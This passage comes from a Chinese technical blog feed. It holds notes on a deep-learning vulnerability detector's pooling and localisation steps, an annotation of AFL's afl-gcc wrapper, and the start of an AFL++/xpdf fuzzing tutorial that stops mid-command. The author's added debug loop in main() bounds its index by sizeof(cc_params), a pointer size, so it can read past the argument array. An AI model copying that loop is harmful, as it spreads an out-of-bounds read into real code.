style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>其中，L<sub>i</sub>是一个对角矩阵，L<sub>i</sub>= diag(α<sub>1</sub>，  α<sub>2</sub>，…,α<sub>λ</sub>)。对于脆弱的<code>iSeVC</code>，我们用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>ϵ</mi><mo mathvariant="normal">′</mo></msubsup></mrow><annotation encoding="application/x-tex">x_\epsilon&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">ϵ</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>表示脆弱行<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>ϵ</mi></msub></mrow><annotation encoding="application/x-tex">x_\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">ϵ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>中第一个令牌的位置(1≤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>≤ζ)，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>ϵ</mi></msub></mrow><annotation encoding="application/x-tex">w_\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">ϵ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>ϵ</mi></msub></mrow><annotation encoding="application/x-tex">x_\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">ϵ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>中令牌的数量。</p><p>其中，α<sub>φ</sub>(1≤φ≤λ)取值如下:  对于易受攻击的<code>iSeVC</code>,如果φ∈{<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>ϵ</mi><mo mathvariant="normal">′</mo></msubsup></mrow><annotation encoding="application/x-tex">x_\epsilon&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">ϵ</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>……, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>ϵ</mi><mo mathvariant="normal">′</mo></msubsup></mrow><annotation encoding="application/x-tex">x_\epsilon&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">ϵ</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>+ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mi>ϵ</mi></msub><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">w_\epsilon-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">ϵ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>}，然后我们设置α<sub>φ</sub> = 1;否则，我们设置α φ = 0。对于不脆弱的<code>iSeVC</code>，我们设置α<sub>φ</sub> = 1(1≤φ≤λ)。</p><h4 id="κ-max汇聚层和平均汇聚层共同实现粒度细化"><a class="markdownIt-Anchor" href="#κ-max汇聚层和平均汇聚层共同实现粒度细化"></a> κ-max汇聚层和平均汇聚层共同实现粒度细化。</h4><blockquote><p>κ-max pooling, and average pooling layers</p></blockquote><p>为了使用反向传播训练神经网络，需要κ-max pooling层和average  pooling层对multiply层的输出进行选择和处理。κ-max pooling层选取Mi层输出向量中各元素的κ最大值。平均pooling层计算κ-max  pooling层输出的平均值。直观地说，这两层一起实现了粒度细化，</p><p>有两个原因：</p><ul><li>(i)它们进一步选择multiply层的输出，以获得对应于每个<code>iSeVC</code>的输出，用于反向传播，</li><li>(ii)它们同时考虑了最大值和平均值。</li></ul><p>在形式上，对于<code>iSeVC</code> ei，average  pooling层o<sub>i</sub>的输出定义为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>o</mi><mi>i</mi></msub><mo>=</mo><mi>a</mi><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mi>m</mi><mi>a</mi><msub><mi>x</mi><mi>κ</mi></msub><mo stretchy="false">(</mo><msub><mi>M</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">o_i =  ave(max_κ(M_i))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">κ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p>其中函数max<sub>κ</sub>返回向量中k最大的元素，函数ave返回k最大元素的平均值。训练过程经过反复的向前和向后传播，收敛为一个参数经过微调的BRNN-vdl，对训练数据中的漏洞模式进行编码。</p><h2 id="44-检测和定位漏洞"><a class="markdownIt-Anchor" href="#44-检测和定位漏洞"></a> 4.4 检测和定位漏洞</h2><p>图6突出显示了使用学习后的BRNN-vdl检测和定位目标程序中的漏洞。</p><p>输入是表示从目标程序中提取的<code>iSeVC</code>的向量。我们首先得到<code>iSeVCs</code>中标记对应的激活层的输出，然后计算每一行标记的κ最大输出值的平均值。然后，我们提取输出大于阈值ϑ的代码行，从而导致容易受到攻击的<code>iSeVC</code>和代码行。最后，我们将易受攻击的<code>iSeVC</code>和其中易受攻击的代码行映射到源代码中，作为检测阶段的输出。</p><p>以图4(d)中的<code>iSeVC</code>为例。<code>iSeVC</code>对应的向量是学习后的BRNNvdl神经网络的输入。计算每行标记的κ最大输出值的平均值后，<code>iSeVC</code>被确定为脆弱的，中间代码的脆弱行在图4(d)的19-21行。最后，将<code>iSeVC</code>中的脆弱行映射到源代码中的脆弱行(即图4(a)中的第25行)。</p><p><img src="/posts/33f70302/image-20211221102530200.png" alt="image-20211221102530200"></p>]]></content>
    
    
    <categories>
      
      <category>Paper Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞检测</tag>
      
      <tag>论文笔记</tag>
      
      <tag>DeepLearning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL源码注释（待完成）</title>
    <link href="/posts/7e08c437/"/>
    <url>/posts/7e08c437/</url>
    
    <content type="html"><![CDATA[<h1 id="1-afl-gcc"><a class="markdownIt-Anchor" href="#1-afl-gcc"></a> 1. afl-gcc</h1><ul><li><p>简单函数解释</p><blockquote><ul><li><p><strong>strrchr()</strong></p><p>char *strrchr(const char *str, int c)</p><p>在参数 <strong>str</strong> 所指向的字符串中搜索最后一次出现字符 <strong>c</strong>（一个无符号字符）的位置。</p></li><li><p><strong>access()</strong></p><p>int access(const char* pathname, int mode);</p><p>pathname 是文件的路径名+文件名</p><p>mode：指定access的作用，取值如下</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs undefined">F_OK 值为0，判断文件是否存在<br>X_OK 值为1，判断对文件是可执行权限<br>W_OK 值为2，判断对文件是否有写权限<br>R_OK 值为4，判断对文件是否有读权限<br></code></pre></div></td></tr></table></figure><p>返回值：成功0，失败-1</p></li></ul></blockquote></li></ul><h2 id="find_as"><a class="markdownIt-Anchor" href="#find_as"></a> find_as</h2><p>这个函数用来寻找<code>afl-as</code>的位置。</p><ul><li>它首先检查是否存在AFL_PATH这个环境变量，如果存在就赋值给afl_path，然后检查<code>afl_path/as</code>这个文件是否可以执行，如果可以执行，就将afl_path设置为as_path。</li><li>如果不存在AFL_PATH这个环境变量，则检查argv0，例如（”~/AFL/afl-gcc”）中是否存在’/‘，如果有就找到最后一个’/‘所在的位置，并取其前面的字符串作为dir，然后检查<code>dir/afl-as</code>这个文件是否可以执行，如果可以访问，就将dir设置为as_path</li><li>如果上述两种方式都失败，则抛出异常。</li></ul><h2 id="edit_params"><a class="markdownIt-Anchor" href="#edit_params"></a> edit_params</h2><p>这个函数主要是将argv拷贝到<code>u8 **cc_params</code>中，并做必要的编辑。</p><ul><li>它首先通过ck_alloc来为cc_params分配内存，分配的长度为<code>(argc+128)*8</code>，相当大的内存了。</li><li>然后检查argv[0]里有没有’/‘，如果没有就赋值’argv[0]’到name，如果有就找到最后一个’/‘所在的位置，然后跳过这个’/‘，使name指向’/'后面的值。</li><li>将name和afl-clang比较，如果相同，<ul><li>则设置clang_mode为1，然后设置环境变量CLANG_ENV_VAR为1。</li><li>然后将name和afl-clang++比较<ul><li>如果相同，则获取环境变量<code>AFL_CXX</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为clang++</li><li>如果不相同，则获取环境变量<code>AFL_CC</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为clang</li></ul></li></ul></li><li>如果不相同，则将name和afl-g++比较<ul><li>如果相同，则获取环境变量<code>AFL_CXX</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为g++</li><li>还比了下gcj，一般用不到</li><li>如果不相同，则获取环境变量<code>AFL_CC</code>的值，如果该值存在，则将cc_params[0]设置为该值，如果不存在，就设置为gcc</li></ul></li><li>然后遍历从argv[1]开始的argv参数<ul><li>跳过<code>-B/integrated-as/-pipe</code></li><li>如果存在<code>-fsanitize=address</code>或者<code>-fsanitize=memory</code>，就设置asan_set为1;</li><li>如果存在<code>FORTIFY_SOURCE</code>，则设置fortify_set为1</li><li><code>cc_params[cc_par_cnt++] = cur</code>;</li></ul></li><li>然后开始设置其他的cc_params参数<ul><li>取之前计算出来的<code>as_path</code>，然后设置<code>-B as_path</code></li><li>如果是clang_mode,则设置<code>-no-integrated-as</code></li><li>如果存在AFL_HARDEN环境变量，则设置<code>-fstack-protector-all</code></li><li>sanitizer<ul><li>if如果asan_set在上面被设置为1，则使<code>AFL_USE_ASAN</code>环境变量为1</li><li>elseif存在AFL_USE_ASAN环境变量，则设置<code>-fsanitize=address</code></li><li>elseif如果存在AFL_USE_MSAN环境变量，则设置<code>-fsanitize=memory</code>，但不能同时还指定<code>AFL_HARDEN</code>或者<code>AFL_USE_ASAN</code>，因为这样运行时速度过慢。</li></ul></li><li>如果不存在AFL_DONT_OPTIMIZE环境变量，则设置<code>-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code></li><li>如果存在AFL_NO_BUILTIN环境变量，则设置<code>-fno-builtin-strcmp</code>等</li></ul></li><li>最后<code>cc_params[cc_par_cnt] = NULL;</code>终止对cc_params的编辑</li></ul><h2 id="main函数"><a class="markdownIt-Anchor" href="#main函数"></a> main函数</h2><p>看到这里，我们就知道afl-gcc就是找到as所在的位置，将其加入搜索路径，然后设置必要的gcc参数和一些宏，然后调用gcc进行实际的编译，仅仅只是一层wrapper</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Main entry point */</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;<br><br>        SAYF(cCYA <span class="hljs-string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        ...<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//查找fake GNU assembler</span><br>    find_as(argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// 设置CC的参数</span><br>    edit_params(argc, argv);<br>    <span class="hljs-comment">// 调用execvp来执行CC</span><br>    <br>    <span class="hljs-comment">// 这里我们在CC之前打印一下参数看看。</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(cc_params); i++) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\targ%d: %s &quot;</span>,i,cc_params[i]);<br>    &#125;<br><br>    execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-keyword">char</span> **) cc_params);<br><br>    FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>通过在执行execvp之前打印命令行参数得到</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> /tmp/hello.c -B /root/src/afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b -g -O<span class="hljs-number">3</span> -funroll-loops -D__AFL_COMPILER=<span class="hljs-number">1</span> -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>可以看到，<code>afl-gcc</code>最终调用<code>gcc</code>，并定义了一些宏，设置了一些参数。其中最关键的就是<code>-B /root/src/afl-2.52b</code>这条。根据<code>gcc --help</code>可知，<code>-B</code>选项用于设置编译器的搜索路径，这里便是设置成<code>/root/src/afl-2.52b</code>(是我设置的环境变量<code>AFL_PATH</code>的值，即AFL目录，因为我没有make install)。</p><p>如果了解编译过程，那么就知道把源代码编译成二进制，主要是经过”源代码”-&gt;”汇编代码”-&gt;”二进制”这样的过程。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是<code>as</code>。不过，编译完成AFL后，在其目录下也会存在一个<code>as</code>文件，并作为符号链接指向<code>afl-as</code>。所以，如果通过<code>-B</code>选项为gcc设置了搜索路径，那么<code>afl-as</code>便会作为汇编器，执行实际的汇编操作。</p><p>所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过<code>afl-as</code>完成。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL安装及简单实践</title>
    <link href="/posts/22ae87fa/"/>
    <url>/posts/22ae87fa/</url>
    
    <content type="html"><![CDATA[<h1 id="一-afl简介"><a class="markdownIt-Anchor" href="#一-afl简介"></a> 一、AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Micha Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><p>①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</p><p>②选择一些输入文件，作为初始测试集加入输入队列（queue）；</p><p>③将队列中的文件按一定的策略进行“突变”；</p><p>④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;</p><p>⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。</p><p><img src="/posts/22ae87fa/image-20211201143448119.png" alt="image-20211201143448119"></p><h1 id="二-afl简单测试"><a class="markdownIt-Anchor" href="#二-afl简单测试"></a> 二、AFL简单测试</h1><p>这部分采用<a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201">fuzzing101</a>提供的练习进行快速熟悉AFL的基本操作</p><h2 id="获取fuzz目标"><a class="markdownIt-Anchor" href="#获取fuzz目标"></a> 获取fuzz目标</h2><p>创建一个文件夹用来存放fuzz目标（xpdf)</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> <span class="hljs-variable">$HOME</span><br><span class="hljs-keyword">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-keyword">cd</span> fuzzing_xpdf/<br></code></pre></div></td></tr></table></figure><p>安装开发必要的软件包，build-essential包含gcc、g++等开发必要的包</p><blockquote><p>具体包括</p><p>dpkg-dev fakeroot g++ g+±4.6 libalgorithm-diff-perl<br>libalgorithm-diff-xs-perl libalgorithm-merge-perl<br>libdpkg-perl libstdc++6-4.6-dev libtimedate-perl</p></blockquote><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> build-essential<br></code></pre></div></td></tr></table></figure><p>下载Xpdf 3.02:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.xpdfreader.com/old/xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br><span class="hljs-attribute">tar</span> -xvzf xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br></code></pre></div></td></tr></table></figure><p>Build Xpdf:</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></div></td></tr></table></figure><blockquote><p>./configure make make install <a href>具体解释可见</a></p></blockquote><p>为了测试，先下载测试样例</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br>mkdir pdf_examples &amp;&amp; cd pdf_examples<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mozilla/</span>pdf.js-sample-files<span class="hljs-regexp">/raw/m</span>aster/helloworld.pdf<br>wget http:<span class="hljs-regexp">//</span>www.africau.edu<span class="hljs-regexp">/images/</span>default/sample.pdf<br>wget https:<span class="hljs-regexp">//</span>www.melbpc.org.au<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2017/</span><span class="hljs-number">10</span>/small-example-pdf-file.pdf<br></code></pre></div></td></tr></table></figure><p>测试pdfinfo二进制文件</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdfinfo -box -meta <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples/helloworld.pdf<br></code></pre></div></td></tr></table></figure><p>You should see something like this:</p><h2 id="安装afl"><a class="markdownIt-Anchor" href="#安装afl"></a> 安装AFL++</h2><p>安装必要的依赖</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-dev<br></code></pre></div></td></tr></table></figure><p>获取和构建AFL++</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> $HOME<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-keyword">cd</span> AFLplusplus<br>export LLVM_CONFIG=<span 